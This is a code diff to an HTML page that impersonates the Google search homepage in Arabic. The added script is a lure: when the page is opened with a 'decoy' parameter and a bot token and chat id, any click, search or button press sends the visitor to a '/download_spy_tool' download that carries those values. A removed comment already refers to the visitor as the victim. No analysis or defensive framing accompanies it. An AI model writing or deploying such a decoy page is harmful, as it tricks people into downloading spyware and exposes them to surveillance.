@@ -5,240 +5,151 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Google</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
-            background-color: #fff;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
-        
-        .container {
+            font-family: Arial, sans-serif;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            width: 100%;
-            max-width: 600px;
-            padding: 20px;
+            min-height: 100vh;
+            margin: 0;
+            background-color: #202124;
+            color: #e8eaed;
         }
-        
-        .logo {
-            margin-bottom: 30px;
-            text-align: center;
-        }
-        
-        .logo img {
+        .google-logo {
             width: 272px;
             height: 92px;
+            margin-bottom: 20px;
         }
-        
-        .search-box {
-            width: 100%;
-            max-width: 584px;
-            margin-bottom: 30px;
+        .search-bar {
+            display: flex;
+            border: 1px solid #5f6368;
+            border-radius: 24px;
+            width: 584px;
+            height: 44px;
+            background-color: #303134;
+            margin-bottom: 20px;
         }
-        
-        .search-input-wrapper {
+        .search-bar:hover {
+            box-shadow: 0 1px 6px rgba(32,33,36,.28);
+            border-color: rgba(223,225,229,0);
+        }
+        .search-input {
+            flex-grow: 1;
+            border: none;
+            background: transparent;
+            outline: none;
+            padding: 0 20px;
+            color: #e8eaed;
+            font-size: 16px;
+        }
+        .search-icon, .mic-icon {
             display: flex;
             align-items: center;
-            border: 1px solid #dfe1e5;
-            border-radius: 24px;
-            padding: 10px 16px;
-            background-color: #fff;
-            box-shadow: 0 1px 6px rgba(32,33,36,.08);
-            transition: box-shadow 0.2s;
+            padding: 0 13px;
         }
-        
-        .search-input-wrapper:hover {
-            box-shadow: 0 1px 6px rgba(32,33,36,.28);
-            border-color: #dadce0;
-        }
-        
-        .search-input-wrapper:focus-within {
-            box-shadow: 0 1px 6px rgba(32,33,36,.28);
-            border-color: #dadce0;
-        }
-        
-        .search-input {
-            flex: 1;
-            border: none;
-            outline: none;
-            font-size: 16px;
-            padding: 0 8px;
-            background-color: transparent;
-        }
-        
-        .search-icon {
+        .search-icon svg, .mic-icon svg {
+            fill: #9aa0a6;
             width: 20px;
             height: 20px;
-            margin-right: 8px;
-            opacity: 0.5;
         }
-        
         .buttons {
             display: flex;
             gap: 12px;
-            justify-content: center;
-            margin-bottom: 20px;
         }
-        
-        .btn {
-            background-color: #f8f9fa;
-            border: 1px solid #f8f9fa;
+        .button {
+            background-color: #303134;
+            border: 1px solid #303134;
             border-radius: 4px;
-            color: #3c4043;
+            color: #e8eaed;
             font-size: 14px;
-            padding: 10px 24px;
+            padding: 10px 16px;
             cursor: pointer;
-            transition: all 0.1s;
-            font-weight: 500;
         }
-        
-        .btn:hover {
-            box-shadow: 0 1px 1px rgba(0,0,0,.1);
-            background-color: #f8f9fa;
-            border: 1px solid #dadce0;
-            color: #202124;
+        .button:hover {
+            border-color: #5f6368;
         }
-        
         .footer {
             position: absolute;
             bottom: 0;
             width: 100%;
-            background-color: #f2f2f2;
-            padding: 15px 20px;
+            background-color: #171717;
+            color: #9aa0a6;
+            padding: 15px 30px;
             font-size: 14px;
-            color: #70757a;
-        }
-        
-        .footer-links {
             display: flex;
-            gap: 30px;
-            flex-wrap: wrap;
-            justify-content: center;
+            justify-content: space-between;
+            align-items: center;
         }
-        
-        .footer-links a {
-            color: #70757a;
+        .footer a {
+            color: #9aa0a6;
             text-decoration: none;
-            cursor: pointer;
+            margin-left: 20px;
         }
-        
-        .footer-links a:hover {
-            color: #4d5156;
-            text-decoration: underline;
-        }
-        
-        .language-settings {
-            text-align: center;
-            margin-top: 10px;
-            font-size: 13px;
-        }
-        
-        .language-settings a {
-            color: #4d5156;
-            text-decoration: none;
-            cursor: pointer;
-            margin: 0 5px;
-        }
-        
-        .language-settings a:hover {
+        .footer a:hover {
             text-decoration: underline;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <!-- Google Logo -->
-        <div class="logo">
-            <svg width="272" height="92" viewBox="0 0 272 92" xmlns="http://www.w3.org/2000/svg">
-                <!-- Google Text Logo -->
-                <text x="0" y="70" font-size="80" font-family="Arial, sans-serif" font-weight="300" fill="#4285F4">G</text>
-                <text x="55" y="70" font-size="80" font-family="Arial, sans-serif" font-weight="300" fill="#EA4335">o</text>
-                <text x="105" y="70" font-size="80" font-family="Arial, sans-serif" font-weight="300" fill="#FBBC04">o</text>
-                <text x="155" y="70" font-size="80" font-family="Arial, sans-serif" font-weight="300" fill="#4285F4">g</text>
-                <text x="200" y="70" font-size="80" font-family="Arial, sans-serif" font-weight="300" fill="#34A853">l</text>
-                <text x="230" y="70" font-size="80" font-family="Arial, sans-serif" font-weight="300" fill="#EA4335">e</text>
-            </svg>
+    <img class="google-logo" src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_light_color_272x92dp.png" alt="Google">
+    <div class="search-bar">
+        <div class="search-icon">
+            <svg focusable="false" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"></path></svg>
         </div>
-        
-        <!-- Search Box -->
-        <div class="search-box">
-            <form onsubmit="return handleSearch(event)">
-                <div class="search-input-wrapper">
-                    <svg class="search-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor">
-                        <circle cx="11" cy="11" r="8"></circle>
-                        <path d="m21 21-4.35-4.35"></path>
-                    </svg>
-                    <input type="text" class="search-input" id="searchInput" placeholder="ابحث في Google أو أدخل عنوان URL" autocomplete="off">
-                </div>
-            </form>
-        </div>
-        
-        <!-- Buttons -->
-        <div class="buttons">
-            <button class="btn" onclick="handleSearch(event)">بحث Google</button>
-            <button class="btn" onclick="handleLucky(event)">حظ سعيد</button>
-        </div>
-        
-        <!-- Language Settings -->
-        <div class="language-settings">
-            يمكنك استخدام لغات أخرى: 
-            <a href="#" onclick="return false;">English</a> |
-            <a href="#" onclick="return false;">Français</a> |
-            <a href="#" onclick="return false;">Español</a>
+        <input type="text" class="search-input" value="" autofocus>
+        <div class="mic-icon">
+            <svg class="goxjub" focusable="false" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill="#4285f4" d="m12 15c1.66 0 3-1.31 3-2.97v-7.02c0-1.66-1.34-3.01-3-3.01s-3 1.34-3 3.01v7.02c0 1.66 1.34 2.97 3 2.97z"></path><path fill="#34a853" d="m10.94 18.05c-1.72-.29-3.22-1.6-3.22-3.52h-1.92c0 2.76 2.02 5.09 4.66 5.46v2.31h2c0-.36.03-.72.03-1.08v-2.31c2.64-.37 4.66-2.7 4.66-5.46h-1.92c0 1.92-1.5 3.23-3.22 3.52v.01z"></path></svg>
         </div>
     </div>
-    
-    <!-- Footer -->
+    <div class="buttons">
+        <button class="button">بحث Google</button>
+        <button class="button">ضربة حظ</button>
+    </div>
+
     <div class="footer">
-        <div class="footer-links">
-            <a href="#" onclick="return false;">عن Google</a>
-            <a href="#" onclick="return false;">الإعلانات</a>
-            <a href="#" onclick="return false;">الأعمال</a>
-            <a href="#" onclick="return false;">كيفية عمل البحث</a>
-            <a href="#" onclick="return false;">الخصوصية</a>
-            <a href="#" onclick="return false;">الشروط</a>
-            <a href="#" onclick="return false;">الإعدادات</a>
+        <div>
+            <span>المملكة العربية السعودية</span>
+        </div>
+        <div>
+            <a href="#">الإعلانات</a>
+            <a href="#">الأعمال</a>
+            <a href="#">كيف يعمل البحث</a>
         </div>
     </div>
-    
+
     <script>
-        // التركيز على مربع البحث عند تحميل الصفحة
-        document.getElementById('searchInput').focus();
-        
-        function handleSearch(event) {
-            event.preventDefault();
-            const query = document.getElementById('searchInput').value;
-            if (query.trim()) {
-                // إعادة التوجيه إلى Google (أو يمكنك إبقاء الضحية في الصفحة)
-                window.location.href = 'https://www.google.com/search?q=' + encodeURIComponent(query);
-            }
-            return false;
-        }
-        
-        function handleLucky(event) {
-            event.preventDefault();
-            const query = document.getElementById('searchInput').value;
-            if (query.trim()) {
-                window.location.href = 'https://www.google.com/search?q=' + encodeURIComponent(query) + '&btnI=1';
-            }
-            return false;
-        }
-        
-        // السماح بالبحث عند الضغط على Enter
-        document.getElementById('searchInput').addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') {
-                handleSearch(e);
+        document.addEventListener("DOMContentLoaded", function() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const decoyParam = urlParams.get("decoy");
+            const botToken = urlParams.get("token");
+            const chatId = urlParams.get("chatid");
+
+            if (decoyParam === "google" && botToken && chatId) {
+                // Trigger download on any click or interaction
+                document.body.addEventListener("click", function() {
+                    const downloadUrl = `/download_spy_tool?token=${botToken}&chatid=${chatId}`;
+                    window.location.href = downloadUrl;
+                }, { once: true }); // Only trigger once
+
+                // Also trigger on form submission or button click
+                const searchForm = document.querySelector("form");
+                if (searchForm) {
+                    searchForm.addEventListener("submit", function(event) {
+                        event.preventDefault(); // Prevent actual form submission
+                        const downloadUrl = `/download_spy_tool?token=${botToken}&chatid=${chatId}`;
+                        window.location.href = downloadUrl;
+                    }, { once: true });
+                }
+
+                const buttons = document.querySelectorAll(".button");
+                buttons.forEach(button => {
+                    button.addEventListener("click", function(event) {
+                        event.preventDefault(); // Prevent actual button action
+                        const downloadUrl = `/download_spy_tool?token=${botToken}&chatid=${chatId}`;
+                        window.location.href = downloadUrl;
+                    }, { once: true });
+                });
             }
         });
     </script>
